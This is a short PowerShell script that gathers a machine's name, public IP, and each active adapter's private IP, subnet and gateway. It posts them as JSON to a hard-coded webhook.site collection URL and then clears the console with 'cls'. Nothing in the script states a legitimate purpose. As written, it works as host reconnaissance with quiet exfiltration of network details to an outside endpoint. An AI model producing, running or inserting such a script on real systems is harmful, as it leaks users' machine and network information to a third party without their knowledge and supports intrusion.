# Get the computer name
$computerName = $env:COMPUTERNAME

# Get the public IP using an API
$publicIP = Invoke-RestMethod -Uri "https://api.ipify.org"

# Get the network adapters (both Wi-Fi and Ethernet)
$adapters = Get-NetAdapter | Where-Object { $_.Status -eq 'Up' }

# Prepare a list to store the adapter information
$adapterInfo = @()

foreach ($adapter in $adapters) {
    # Get the IP address, subnet, and default gateway for the current adapter
    $ipConfig = Get-NetIPAddress -InterfaceIndex $adapter.InterfaceIndex
    $ipDetails = $ipConfig | Where-Object { $_.IPAddress -match '^10\.' -or $_.IPAddress -match '^172\.(1[6-9]|2[0-9]|3[0-1])\.' -or $_.IPAddress -match '^192\.168\.' }

    # Get the subnet and default gateway
    $subnet = $ipConfig.PrefixLength
    $gateway = (Get-NetRoute -InterfaceIndex $adapter.InterfaceIndex | Where-Object { $_.DestinationPrefix -eq '0.0.0.0/0' }).NextHop

    # Store the information for each adapter
    $adapterInfo += [PSCustomObject]@{
        AdapterName  = $adapter.Name
        IPAddress    = $ipDetails.IPAddress
        Subnet       = "/$subnet"
        Gateway      = $gateway
    }
}

# Output the adapter information
$adapterInfo | ForEach-Object { Write-Host "Adapter: $($_.AdapterName), IP: $($_.IPAddress), Subnet: $($_.Subnet), Gateway: $($_.Gateway)" }

# Prepare the JSON payload
$body = @{
    ComputerName = $computerName
    PublicIP     = $publicIP
    Adapters     = $adapterInfo
} | ConvertTo-Json -Depth 2

# Define the webhook URL
$webhookUrl = "	https://webhook.site/2fe522fb-2bca-4689-aeeb-5169bf06f0e8"

# Send the JSON data to the webhook
Invoke-WebRequest -Uri $webhookUrl -Method Post -Body $body -ContentType "application/json"

Write-Output "Data sent to webhook successfully!"

cls

return
 

exit


